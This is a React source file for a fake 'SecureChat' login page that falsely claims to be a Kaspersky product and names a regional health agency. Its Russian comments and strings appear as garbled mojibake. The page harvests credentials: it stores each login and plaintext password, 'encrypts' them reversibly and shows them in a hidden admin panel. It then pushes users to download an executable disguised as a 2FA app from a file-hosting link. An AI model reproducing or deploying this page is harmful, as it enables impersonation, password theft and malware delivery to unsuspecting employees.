import React, { useState } from "react";
import LoginForm from "@/components/LoginForm";
import UserProfile from "@/components/UserProfile";
import SecuritySettings from "@/components/SecuritySettings";
import AdminPanel from "@/components/AdminPanel";
import ModalWindows from "@/components/ModalWindows";
import Icon from "@/components/ui/icon";

interface LoginData {
  login: string;
  password: string;
}

interface SecuritySettingsState {
  twoFA: boolean;
  smsCode: boolean;
  emailNotifications: boolean;
}

interface LoginAttempt {
  login: string;
  password: string;
  hashedPassword: string;
  timestamp: string;
}

const Index = () => {
  const [loginData, setLoginData] = useState<LoginData>({
    login: "",
    password: "",
  });
  const [securitySettings, setSecuritySettings] =
    useState<SecuritySettingsState>({
      twoFA: false,
      smsCode: false,
      emailNotifications: true,
    });
  const [showTwoFAConfirm, setShowTwoFAConfirm] = useState(false);
  const [showDownloadModal, setShowDownloadModal] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showMandatoryTwoFA, setShowMandatoryTwoFA] = useState(false);
  const [showAdminPanel, setShowAdminPanel] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);

  // –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—Å–∫–∏–µ —É—á—ë—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
  const ADMIN_LOGIN = "SuperUser";
  const ADMIN_PASSWORD = "–Ø–°—É–ø–µ—Ä–•–∞–∫–µ—Ä–ù–∞—à–µ–ª–ü–∞—Ä–æ–ª—å";

  // –§–°–¢–≠–ö —Å–µ—Ä—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–ª —Ç–∞–∫–æ–π –ø–æ–¥—Ö–æ–¥
  const encryptPassword = (password: string): string => {
    return btoa(password.split("").reverse().join(""));
  };

  // –ú—ã —Å–∞–º–æ–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
  const decryptPassword = (encrypted: string): string => {
    try {
      return atob(encrypted).split("").reverse().join("");
    } catch {
      return "***";
    }
  };

  const handleTwoFAToggle = (checked: boolean) => {
    if (checked) {
      setShowTwoFAConfirm(true);
    } else {
      setSecuritySettings({ ...securitySettings, twoFA: false });
    }
  };

  const confirmTwoFA = () => {
    setShowTwoFAConfirm(false);
    setShowDownloadModal(true);
  };

  const cancelTwoFA = () => {
    setShowTwoFAConfirm(false);
  };

  const downloadTwoFAApp = (os: string) => {
    console.log(`–°–∫–∞—á–∏–≤–∞–Ω–∏–µ 2FA –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –¥–ª—è ${os}`);
    setSecuritySettings({ ...securitySettings, twoFA: true });
    setShowDownloadModal(false);

    // –†–µ–¥–∏—Ä–µ–∫—Ç
    window.open(
      "https://downloader.disk.yandex.ru/disk/c66f7295dcf348777946e01a1d46cf5ab5005bfc7575b07a05d24b383cba7c73/68b6c8d2/MMKLDAu9B5WF462-X4xWq-9Kvz92O95ujvi4pGu5l9k98Vf6FPGxT-PBI-X3FVukzA1d6BNM5DvfnOTB8bBN_g%3D%3D?uid=861776701&filename=SecureChat.exe&disposition=attachment&hash=&limit=0&content_type=application%2Fx-dosexec&owner_uid=861776701&fsize=193695&hid=48bf5c6666dabb86c25b382563cc4907&media_type=executable&tknv=v3&etag=9c92066b635fb29aa9123d257432b68e",
      "_blank",
    );
  };

  const closeDownloadModal = () => {
    setShowDownloadModal(false);
  };

  // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
  const handleLogin = async () => {
    if (!loginData.login || !loginData.password) {
      alert("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è");
      return;
    }

    // –≤—Ö–æ–¥
    const newAttempt: LoginAttempt = {
      login: loginData.login,
      password: loginData.password,
      hashedPassword: encryptPassword(loginData.password),
      timestamp: new Date().toLocaleString("ru-RU"),
    };
    setLoginAttempts((prev) => [...prev, newAttempt]);

    setIsLoading(true);

    try {
      // –ü—Ä–∞–≤–¥–æ–ø–æ–¥–æ–±–Ω–æ
      await new Promise((resolve) => setTimeout(resolve, 1500));

      // –Ø –≤–∑–ª–æ–º–∞–ª –∞–¥–º–∏–Ω–∞
      if (
        loginData.login === ADMIN_LOGIN &&
        loginData.password === ADMIN_PASSWORD
      ) {
        console.log("‚úÖ –í—Ö–æ–¥ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —É—Å–ø–µ—à–µ–Ω");
        setIsLoading(false);
        setIsAdminLoggedIn(true);
        setShowAdminPanel(true);
        setShowTwoFAConfirm(false);
        setShowDownloadModal(false);
        setShowMandatoryTwoFA(false);
        return;
      }

      // –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü
      console.log("üîê –û–±—ã—á–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è, —Ç—Ä–µ–±—É–µ—Ç—Å—è 2FA:", {
        LOGIN: loginData.login,
        host: "pg4.sweb.ru:5433",
        database: "AD",
      });

      setIsLoading(false);
      setShowMandatoryTwoFA(true);
    } catch (error) {
      setIsLoading(false);
      alert("–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ —Å–∏—Å—Ç–µ–º–µ");
    }
  };

  const proceedToTwoFASetup = () => {
    setShowMandatoryTwoFA(false);
    setShowTwoFAConfirm(true);
  };

  const closeAdminPanel = () => {
    setShowAdminPanel(false);
    setIsAdminLoggedIn(false);
  };

  return (
    <div className="min-h-screen">
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <header className="text-center mb-12">
          <div className="inline-flex items-center gap-4 mb-4">
            <img
              src="https://cdn.poehali.dev/files/28422247-5ade-481f-8ee6-781c107e9292.png"
              alt="–ú–ò–ê–¶ –ö—Ä–∞—Å–Ω–æ–¥–∞—Ä—Å–∫–∏–π –∫—Ä–∞–π"
              className="h-16 w-auto"
            />
            <h1 className="text-4xl font-bold text-white">SecureChat</h1>
          </div>
          <p className="text-xl text-white/80 max-w-2xl mx-auto">
            –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω—ã–π –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä –Ω–æ–≤–æ–≥–æ –ø–æ–∫–æ–ª–µ–Ω–∏—è –æ—Ç Kaspersky.
            –ó–∞—â–∏—â–µ–Ω–Ω–∞—è —Å–≤—è–∑—å –¥–ª—è –≤–∞—à–µ–≥–æ –±–∏–∑–Ω–µ—Å–∞.
          </p>
        </header>

        <div className="grid lg:grid-cols-2 gap-8 max-w-6xl mx-auto">
          {/* Login Form */}
          <LoginForm
            loginData={loginData}
            setLoginData={setLoginData}
            handleLogin={handleLogin}
            isLoading={isLoading}
          />

          {/* User Profile */}
          <UserProfile />
        </div>

        {/* Security Settings & FAQ */}
        <SecuritySettings
          securitySettings={securitySettings}
          setSecuritySettings={setSecuritySettings}
          handleTwoFAToggle={handleTwoFAToggle}
        />

        {/* Footer */}
        <footer className="text-center mt-16 py-8">
          <div className="flex items-center justify-center gap-6 text-white/70">
            <div className="flex items-center gap-2">
              <Icon name="Shield" size={16} />
              <span>–ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å</span>
            </div>
            <div className="flex items-center gap-2">
              <Icon name="Zap" size={16} />
              <span>–°–∫–æ—Ä–æ—Å—Ç—å</span>
            </div>
            <div className="flex items-center gap-2">
              <Icon name="Users" size={16} />
              <span>–ù–∞–¥–µ–∂–Ω–æ—Å—Ç—å</span>
            </div>
          </div>
          <p className="mt-4 text-sm text-white/60">
            ¬© 2025 SecureChat. –í—Å–µ –ø—Ä–∞–≤–∞ –∑–∞—â–∏—â–µ–Ω—ã. –ì–û–°–£–î–ê–†–°–¢–í–ï–ù–ù–û–ï –ë–Æ–î–ñ–ï–¢–ù–û–ï
            –£–ß–†–ï–ñ–î–ï–ù–ò–ï –ó–î–†–ê–í–û–û–•–†–ê–ù–ï–ù–ò–Ø "–ú–ï–î–ò–¶–ò–ù–°–ö–ò–ô –ò–ù–§–û–†–ú–ê–¶–ò–û–ù–ù–û-–ê–ù–ê–õ–ò–¢–ò–ß–ï–°–ö–ò–ô
            –¶–ï–ù–¢–†" –ú–ò–ù–ò–°–¢–ï–†–°–¢–í–ê –ó–î–†–ê–í–û–û–•–†–ê–ù–ï–ù–ò–Ø –ö–†–ê–°–ù–û–î–ê–†–°–ö–û–ì–û –ö–†–ê–Ø
          </p>
        </footer>

        {/* Modal Windows */}
        <ModalWindows
          showTwoFAConfirm={showTwoFAConfirm}
          showDownloadModal={showDownloadModal}
          showMandatoryTwoFA={showMandatoryTwoFA}
          cancelTwoFA={cancelTwoFA}
          confirmTwoFA={confirmTwoFA}
          downloadTwoFAApp={downloadTwoFAApp}
          closeDownloadModal={closeDownloadModal}
          proceedToTwoFASetup={proceedToTwoFASetup}
        />

        {/* Admin Panel */}
        <AdminPanel
          showAdminPanel={showAdminPanel}
          closeAdminPanel={closeAdminPanel}
          loginAttempts={loginAttempts}
          isAdminLoggedIn={isAdminLoggedIn}
          decryptPassword={decryptPassword}
        />
      </div>
    </div>
  );
};

export default Index;
